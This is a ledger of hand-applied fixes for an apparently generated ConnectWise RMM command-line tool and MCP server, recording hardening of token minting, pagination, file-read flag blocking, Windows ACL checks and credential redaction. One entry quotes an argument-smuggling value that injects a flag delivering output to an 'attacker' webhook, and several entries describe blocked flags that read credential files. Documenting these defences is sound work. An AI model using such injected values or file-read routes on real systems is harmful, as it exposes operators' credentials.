_comment: Connector-specific edits to GENERATED/authored files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and banned anti-patterns absent) and fails CI if a reprint dropped one.

handfixes.summary: The OAuth client-credentials mint posts a JSON body {grant_type, client_id, client_secret, scope} to the token URL of the client ID's region (0e30 NA, 0e31 EU, 0e32 AU), from the client auto-mint, `auth login` and `scopes` alike.
handfixes.why: The press mints with a form-encoded body plus HTTP Basic, and ConnectWise Asio rejects both: credential-less probes of https://openapi.service.itsupport247.net/v1/token on 2026-10-13 returned 400 'failed to decode request invalid JSON' for form encoding and for form + Basic, and the documented 404 'oauth app does not exist' only for a JSON body (receipt: cli-factory/connectwise-rmm/sources/token-probe-2026-10-13.txt). Asio also runs separate NA/EU/AU gateways and the client ID prefix names the region (ConnectWise University, 'Agent Last Seen API'), so an EU or AU tenant minting against the NA default would fail every request. Re-applied after a regen by ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (regen.sh -> apply_handfixes.py, polish_handfixes.py, doc_handfixes.py); a reprint that skips those scripts drops it while go build and go test stay green, and this entry is what notices.

asserts.contains: req, err := NewAsioTokenRequest(ctx, tokenURL, clientID, clientSecret, resolveClientCredentialsScope(), resolveClientCredentialsUserAgent())

handfixes.summary: Generated with --transport standard, so the client uses a clone of net/http's default transport instead of the community-spec default HTTP/2 browser-impersonation transport (github.com/enetx/surf).
handfixes.why: The spec is a community-sourced Asio OpenAPI, and the press picks the browser-chrome transport for community specs. Asio is a plain partner REST gateway with no bot wall; the impersonation stack adds a large dependency tree (enetx/surf, utls, http3) to every binary and changes TLS fingerprints for no benefit. regen.sh passes --transport standard; a reprint without it would silently switch transports.
handfixes.spec_encode_followup: regen.sh carries --transport standard on the generate command line; there is no spec extension for it yet.

handfixes.summary: `tickets list` never sends pageSize or pageNum alone: --page-size by itself is paired with pageNum=1, --page-num by itself is refused before any request, and sync stores the unpaged response instead of the press's auto-pagination. The MCP execute tool (code_orch.go) applies the same pairing to tickets.list.
handfixes.why: The Asio ticket list documents that pageSize must be sent with pageNum and that either one alone is ignored or returns an empty page with a total count of 0 even when records exist. The press's generic paginator sent one paging key at a time, which on Asio reads as 'no tickets'. Encoded in the spec as x-pp-pagination: none on GET /api/platform/v1/service/ticketing/tickets, so a reprint from the same spec keeps it; the asserts catch a reprint from a spec that lost the extension. Acceptance (cli-factory/connectwise-rmm/acceptance/accept.sh) proves page 2 returns and that no request ever carries a lone paging key. Codex review (2026-10-13) caught that the generated flag retention still forwarded a lone --page-size; RunE now pairs or refuses, and tickets_paging_test.go drives both cases against a stub server. Codex round 2 caught the twin: connectwise-rmm_execute on tickets.list forwarded a lone pageSize; TestCodeOrchTicketsListPairsPagingKeys pins it.
handfixes.spec_encode_followup: Already encoded in spec.yaml (x-pp-pagination: none); keep the extension on any spec refresh.

handfixes.summary: Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element, and the reachable appendRecipePositional call site (why_did_the_script_fail's task_id) first runs rejectFlagLikeRecipeValue, which refuses a value beginning with '-' (except the bare '-') before the CLI runs. Also: the press's recipe lifter read the hyphenated subcommands 'reboot-due' and 'task-failures' as a positional 'slug' parameter; both handlers now run a static subcommand.
handfixes.why: Press 4.33.5 still emits the fleet-wide recipe argv gap (see skills/acronis/handfixes.json, mcp-recipe-argv-not-flag-like): a recipe positional is appended ahead of the recipe's own flags, so {"task_id": "--deliver=webhook:https://attacker/"} would be parsed by pflag as the denylisted root flag. The lifter defect made the reboot_queue tool demand a meaningless required 'slug' argument and splice it into argv as a subcommand. recipe_intents_test.go pins both: the corrected argv and the refusal of flag-shaped task_id values. Re-applied after a regen by ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (regen.sh -> apply_handfixes.py, polish_handfixes.py, doc_handfixes.py); a reprint that skips those scripts drops it while go build and go test stay green, and this entry is what notices.

handfixes.summary: Saving config (after a token mint or auth login) writes the base_url and token_url the config FILE had, never a runtime value from CONNECTWISE_RMM_BASE_URL, CONNECTWISE_RMM_TOKEN_URL or region inference.
handfixes.why: Every mint calls SaveTokens, which rewrites config.toml. Without this, one run with CONNECTWISE_RMM_BASE_URL pointed at a test host, or one run where the client ID's prefix inferred the EU or AU host, was written into the file and silently pinned every later run, including runs for a different client ID. Re-applied after a regen by ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (regen.sh -> apply_handfixes.py, polish_handfixes.py, doc_handfixes.py); a reprint that skips those scripts drops it while go build and go test stay green, and this entry is what notices.

handfixes.summary: doctor treats a configured client ID and secret as configured auth, and verifies the credential with an authenticated GET /v1/rate_limits (needs a token, no scope) instead of printing 'present, not verified'; a 404 there turns the api row red, and a failed token mint is reported as a rejected credential with the scopes remedy.
handfixes.why: Measured by tools/maintainer/check_doctor_truth.py (issue #282). The 4.33.5 doctor failed that gate on this connector: 'present, not verified' in the healthy state, an HTML 200 at / read as a healthy API in the wrong-base state, and an identical credentials verdict whether the credential worked or not. On a real install it was worse: with CONNECTWISE_RMM_CLIENT_ID and CONNECTWISE_RMM_CLIENT_SECRET set on a fresh machine it printed 'FAIL Auth: not configured' plus a hint to export the variables the operator had already exported, because the pair only becomes a bearer token after the first mint. Verified against the factory mock: valid secret -> 'valid (verified with GET /v1/rate_limits)'; wrong secret -> 'ERROR rejected: the token request failed'; key lacking a default scope -> rejected with the `scopes` remedy; no credential -> explicit ERROR row.

handfixes.summary: Every operator-facing variable this connector reads is declared on all three install channels (manifest.json for the .mcpb, server.json for the MCP Registry, mcp-install.md for manual installs), with matching required/secret flags; the manifest name and entry point are the stripped connectwise-rmm-mcp.
handfixes.why: Issue #282: a variable the binary reads but the manifest never declares is one Claude Desktop never prompts for. The press manifest declared only CLIENT_ID and CLIENT_SECRET, so the region override, the scope list (needed whenever the key lacks one default scope, since Asio then rejects the whole token request), the MCP read-only kill switch and the HTTP transport token were unreachable from a bundle install, and server.json marked all of them required and secret. manifest.json, server.json and mcp-install.md are regenerated by /msp-skills-publish on every re-onboard (server.json keeps a hand-curated env list), so without this ledger a regeneration silently drops declarations while check_env_schema.py is the only other line of defence. The source manifest in ~/printing-press/library/connectwise-rmm carries the declarations so a resume re-derives mcp-install.md from them. PRINTING_PRESS_CLIENT_PROFILE stays declared because check_env_schema.py fails a variable the binary reads (internal/platform/profile.go) but no channel declares; its title and description say it is unused, because this connector registers no platform source (registerPlatformSource has no caller), so BindMCPServerProfile returns immediately and the value binds nothing. The press text promised tenant binding (Codex review 2026-10-13, P1). Its twins carry the same truth: the root --client-profile help says it is unused, and "client-profile" is in blockedRootFlags so the 32 MCP tool schemas no longer offer an inert tenant selector (fresh adversarial review 2026-10-13, P2).

handfixes.summary: The local SQLite store is named from the API client ID and API host (config.StoreScopeIdentity), not from a hash of every credential field that happens to be loaded.
handfixes.why: Found by the fresh-context adversarial review on 2026-10-13. The generated store key hashed every loaded credential field, and the first token mint caches client_id/client_secret beside the env copies. On a fresh install the first `sync` therefore wrote data-<hashA>.db and every later command read data-<hashB>.db: guide.md's own Quick Start (doctor --dry-run, scopes, sync) ended with every fleet roll-up returning scanned_endpoints: 0, the MCP sync tool did the same, and dropping the env vars after caching moved to a third file. The factory acceptance suite passed --db explicitly and never saw it. TestAsioStoreScopeStableAcrossMint pins env-only, minted, cached-only and rotated-secret configs to one key and two clients to two keys (it fails with the init hook removed). Lives in the hand-owned internal/config/connectwise_rmm_config.go, which regen.sh copies forward, but the generated config.go must keep the StoreScopeIdentity hook.

handfixes.summary: The MCP shell-out layer refuses local-file READ flags (--input, --notes-file, --playbook-file, --playbook-notes-file, and --home should a command ever declare its own) on top of the write-sink names press 4.33.5 already blocks, a tree test fails the build when any shell-out tool still forwards a flag whose usage text names a filesystem path, and `import` (which requires --input) is hidden from MCP instead of being offered as a tool that always fails.
handfixes.why: Codex review (2026-10-13, P1): teach-playbook --notes-file and teach --playbook-file / --playbook-notes-file read any file the server account can reach (credentials.toml included) into the local store, where playbook_list and sql hand it back, even with CONNECTWISE_RMM_MCP_READ_ONLY=1 since teach is a local-write command; import --input is the same read primitive. Fleet precedent: skills/zammad, huntress, hubspot, datto-bcdr, wordpress (same id). The names are unioned into blockedDestinationFlags, which blockedStructuredArgsForCommand feeds to both the tool schema and cliArgsFromMCP, so the flags vanish from tools/list and are refused at call time. "home" is defensive: the only --home today is the root flag (already in blockedRootFlags), but a command-local --home would bypass the root-flag block. The usage-text rule (isFilesystemPathFlag) is deliberately not a name rule: generated API body fields named like paths go to the vendor, not this disk. Proven both ways: removing the five read names (leaving blockedRootFlags intact) makes TestNoShellOutToolCanDirectAFilesystemPath fail listing import --input, teach --playbook-file/--playbook-notes-file and teach-playbook --notes-file/--playbook-file; restored, it passes, and over stdio tools/list offers none of them and tools/call teach_playbook {notes-file} returns 'unknown MCP parameter' without spawning the CLI. With --input blocked the MCP import tool could never succeed (both Codex round 2 and the fresh adversarial review flagged it), so import carries mcp:hidden: it is CLI-only, which also keeps install-token minting and task scheduling from records out of an agent's reach. Not yet scripted in ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (the library source ~/printing-press/library/connectwise-rmm carries it); a regen that skips it drops it while go build stays green, and these asserts are what notice.
handfixes.spec_encode_followup: Press-side: the read-source names and the usage-text rule belong in the generator's blockedDestinationFlags; a press that emits them natively retires this entry.

handfixes.summary: The MCP execute tool (code orchestration) sends a DELETE's non-path params as a JSON body, so endpoints.uninstall carries endpoints, feedback and reason exactly as the CLI's `endpoints uninstall` does.
handfixes.why: Codex review (2026-10-13, P1): the generated executor routed every DELETE param to the query string and sent no body, while Asio's only DELETE (/api/platform/v1/device/endpoints/uninstall) reads its request from the body, so offboarding through connectwise-rmm_execute could never succeed. No per-endpoint MCP tool exists for uninstall, so execute is the only MCP path. code_orch_delete_body_test.go drives execute against a stub and fails on the generated routing (params leaked to the query string). Not yet scripted in ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (the library source ~/printing-press/library/connectwise-rmm carries it); a regen that skips it drops it while go build stays green, and these asserts are what notice.

handfixes.summary: The MCP shell-out layer forwards an explicit boolean false as --name=false instead of dropping it, so a default-true flag can be turned off from a tool call.
handfixes.why: Codex round 2 (2026-10-13, P2): cliArgsFromMCP emitted only true booleans, so MCP `tail` with {"follow": false} kept the default --follow=true and polled until the call timed out instead of returning one poll. pflag accepts --flag=false for every bool flag, and blocked flags are filtered before this point, so forwarding the caller's explicit value is the faithful translation. bool_false_test.go fails on the generated code (argv carried only --json). Not yet scripted in ~/Documents/Dev/cli-factory/connectwise-rmm/handfixes/ (the library source carries it); a regen that skips it drops it while go build stays green.

handfixes.summary: endpoints list-company and list-site carry low-entropy placeholder UUIDs in their pp:happy-args annotation instead of the vendor-docs sample UUID
handfixes.why: The press copies the spec's path-parameter example into pp:happy-args as clientID=<uuid>. The vendor-docs sample UUID (436f6d6d-...) is high-entropy and sits right after the word client, so gitleaks generic-api-key flags both files and the guards job fails. The value is example data, not a credential; the fix is an obviously fake placeholder, never an allowlist. A reprint from the unchanged spec regenerates the sample UUID.
handfixes.spec_encode_followup: Change the example: values for clientID/siteID on /api/platform/v1/device/clients/{clientID}/endpoints and .../sites/{siteID}/endpoints in cli-factory/connectwise-rmm/spec.yaml to 00000000-0000-0000-0000-000000000001 / ...0002 so a reprint emits these placeholders by construction.

handfixes.summary: the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials
handfixes.why: Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.
handfixes.spec_encode_followup: Press defect in internal/generator/templates/cliutil_creds_perms_eval.go.tmpl and cliutil_creds_perms_windows.go.tmpl (unfixed on press main as of 4.33.5). Reported upstream: https://github.com/mvanhorn/cli-printing-press/issues/5029

handfixes.summary: the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped
handfixes.why: Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.
handfixes.spec_encode_followup: Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029

handfixes.summary: The generator's hidden Cobra alias `create` is removed from the 1 command listed in `why` whose POST deletes, cancels, disables, stops, rolls back or otherwise destroys or disrupts something, so `<parent> create` no longer runs it
handfixes.why: cli-printing-press gives a POST endpoint command the hidden alias `create`. On these commands the POST is destructive, so an agent that guessed the conventional verb (`<group> create`) ran the destructive call, and the alias appeared nowhere in help, agent-context or governance.md. Reproduced on origin/main 6416a241b against a local fake server: `maxio-cli subscriptions purge-json create sub_123 --ack 1` sent POST /subscriptions/sub_123/purge.json, `sentinelone-cli reports create` sent POST /reports/delete-reports and `tactical-rmm-cli agents shutdown create agent-42` sent POST /agents/agent-42/shutdown/. Fleet gate: tools/maintainer/check_command_tree.py, which walks the real cli.RootCmd() tree (137 such commands in 28 connectors on 6416a241b, 0 after). The canonical command names are unchanged; only the alias goes. A reprint re-adds it: remove it again. TestDestructiveCommandsDoNotAnswerToCreate fails while the alias is present. Commands here: tasks schedule (POST /api/platform/v1/automation/endpoints/schedule-tasks).
handfixes.spec_encode_followup: Press-side: emit the `create` alias only for operations that create something.

handfixes.summary: The two derive-lock tests (ContendedAppendIsDerivedBeforeReturn, CaughtUpPassDoesNotWait) wait on what the pass is doing, read from goroutine stacks, instead of fixed 200 ms, 500 ms and 5 s windows; every remaining wait is bounded by the test binary's own deadline
handfixes.why: On windows(fortinet) in CI (2026-10-22, PR #421) the contended test failed with 'contended pass did not finish after the peer released the lock': after release the pass opens a fresh SQLite store and commits, and a slow Windows runner took longer than the fixed 5 s. The 200 ms 'did not return while held' window was also weak: on a slow runner it could elapse before the pass even reached the wait. The contended test now waits until the pass is provably blocked in cliutil.WithFileLock called from DeriveFlagCorrections (it cannot return before release), so it is stronger, not weaker. Proven: a pass that returns early under contention fails it; a caught-up pass that polls or blocks fails the caught-up test; with a simulated 6 s store open after the lock, the old test fails with the CI message and the new one passes.
handfixes.spec_encode_followup: Press-side: the generated internal/learn derive_test.go should use this state-based wait in place of the fixed windows.

handfixes.summary: The token client's same-origin check compares hosts the way the network resolves them: an IP literal by address with an exact IPv6 zone, a DNS name ASCII case-insensitively, a non-ASCII name exactly
handfixes.why: Owner decision on PR #441 (finish the auth-wire class). Press 4.33.5 already sends every token request through cliutil.OAuthTokenHTTPClient, but its oauthTokenSameOrigin compared hostnames with strings.EqualFold, which also folds IPv6 zone names (fe80::1%LAN0 passed for fe80::1%lan0, two different peers when the interfaces differ) and Unicode case. It now compares an IP literal exactly as a netip.Addr (zone included) and folds ASCII case only for DNS names. TestOAuthTokenSameOriginComparesHostsLikeTheNetwork failed on the previous commit and passes now; TestAuthLoginRefusesATokenRedirectToAnotherOrigin pins the login path.
handfixes.spec_encode_followup: Press-side: auth.go.tmpl and client.go.tmpl in press 4.33.5 already route token requests through cliutil.OAuthTokenHTTPClient; oauthTokenSameOrigin should compare IP literals exactly (zone included) and fold ASCII case only for DNS names.

handfixes.summary: One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown); the title of an HTML page returned where JSON was expected; the token refresh endpoint's error body. The token-endpoint redactor every token exchange uses (RedactTokenBody: the client mint, `auth login` and the scopes check) ends in the funnel, after its own replacements and before the 200-byte cut. Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.
handfixes.why: class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \v, \0 and the identity escape, a bounded \u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed.
